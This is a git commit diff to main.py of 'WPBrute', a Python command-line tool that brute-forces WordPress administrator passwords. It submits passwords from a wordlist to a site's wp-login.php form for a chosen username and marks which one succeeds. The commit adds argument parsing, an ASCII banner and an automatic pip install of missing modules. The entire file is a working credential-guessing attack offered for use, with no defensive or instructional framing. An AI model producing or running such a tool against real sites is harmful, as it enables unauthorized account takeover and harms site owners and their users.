cbff7ac4bb1fb424224a959d142d2fd8d191fe96
stand4r <82241829+stand4r@users.noreply.github.com>
2023-10-04 20:38:32 +0400

    Update main.py

--- main.py
+++ main.py
@@ -1,64 +1,88 @@
-from requests import Session
 from threading import Thread
-from colorama import Fore
+import os
+import argparse
 
 class Brute:
-    def __init__(self, password, user, url):
+    def __init__(self, password, user, url, banner):
         self.url = url
+        if 'wp-login.php' not in self.url:
+            print('Invalid URL')
+            exit()
+        self.banner = banner
+        print(banner)
+        print("________________Checking modules________________")
+        try:
+            from requests import Session
+            import colorama
+            print('________________Checking complete_______________')
+        except ImportError:
+            print('________________Downloading modules________________')
+            os.system('pip install requests colorama')
+            from requests import Session
+            import colorama
+            print('________________Download complete________________')
+
+        colorama.init(autoreset=True)
         self.user = user
-        self.passwords = password
+        self.password = password
         self.session = Session()
-        self.response = self.session.get(self.url)
-        if self.response.status_code == 200:
-            print(Fore.GREEN + 'SUCCESSFUL CONNECTION' + Fore.RESET)
-            self.pass_list()
-            print(Fore.GREEN + 'START' + Fore.RESET)
-            thread2 = Thread(target=self.request)
-            thread2.start()
-        else:
-            print('Bad')
-
-    def pass_list(self):
-        self.arr = []
-        if '.txt' in self.passwords:
-            with open(self.passwords, 'r') as f:
-                self.arr = [i.rstrip() for i in f]
-            for i in range(len(self.arr)):
-                try:
-                    self.arr.remove('')
-                    i += 1
-                except:
-                    i += 1
-        else:
-            self.arr.append(self.passwords)
-
-    def request(self):
-        self.post = {'log': self.user,
+        self._post = {'log': self.user,
                      'pwd': '',
                      'wp-submit': 'Войти',
                      'redirect_to': 'wp-admin/',
                      'testcookie': '1'
                      }
-        if len(self.arr) > 1:
-            for i in range(len(self.arr)):
-                self.post['pwd'] = self.arr[i]
-                self.r = self.session.post(self.url, self.post)
-                if 'login_error' in self.r.text:
-                    print(self.arr[i] + Fore.RED + ': incorrect' + Fore.RESET)
-                else:
-                    print(self.arr[i] + Fore.GREEN + ': correct' + Fore.RESET)
-                    break
-        elif len(self.arr) == 1:
-            self.post['pwd'] = self.arr[0]
-            self.r = self.session.post(self.url, self.post)
+        self.thread = Thread(target=self.pass_list)
+        self.thread.run()
+
+    def pass_list(self):
+        if '.txt' in self.password:
+            self.list_passwords = list()
+            with open(password, 'r') as f:
+                self.passwords = f.readlines()
+            f.close()
+            for i in self.passwords:
+                self.list_passwords.append(i.strip('\n'))
+            self.requests()
+        else:
+            self.request()
+
+    def requests(self):
+        print('________________Start Bruteforce________________')
+        for i in self.list_passwords:
+            self._post['pwd'] = i
+            self.r = self.session.post(self.url, self._post)
             if 'login_error' in self.r.text:
-                print(self.arr[0] + Fore.RED + ': incorrect' + Fore.RESET)
+                print(f'{i}: incorrect')
             else:
-                print(self.arr[0] + Fore.GREEN + ': correct' + Fore.RESET)
+                print(f'{i}: CORRECT')
+
+    def request(self):
+        self._post['pwd'] = self.password
+        self.r = self.session.post(self.url, self._post)
+        if 'login_error' in self.r.text:
+            print(f'{self.password}: incorrect')
+        else:
+            print(f'{self.password}: correct')
 
 
 if __name__ == '__main__':
-    url = input('URL: ')
-    user = input('Username: ')
-    password = input('Password or list: ')
-    Brute(password, user, url)
+    wpbrute ='''                                               ____                            _______ 
+                  _    _    _  _____          | /\ \  _____  ___ ___ _________ | ____|
+                 \ \  | |  / / | /\ \   ___   | \/ /  | /\ \ | | | | |__   __| | |___
+                  \ \_| |_/ /  |_\/_/  |___|  | /\ \  | \/_/ | |_| |    | |    | |___
+                   \_______/   |_|            |_\/_/  |_|\_\ |_____|    |_|    |_____|  
+                                                                      ____   ____
+                                                                       \ \   / /
+                                                                        \ \_/ / __  /\  /|  /\ 
+                                                                         \___/      \/=  |= \/ 
+            '''
+    parser = argparse.ArgumentParser(description='WPBrute v0.1.0')
+    parser.add_argument('--url', default=None, help='Url for wp-admin.php')
+    parser.add_argument('-u', default=None, help='Username for bruteforce')
+    parser.add_argument('-p', default=None, help='List passwords or one password')
+    args = parser.parse_args()
+    password = args.p
+    user = args.u
+    url = args.url
+    Brute(password, user, url, wpbrute)
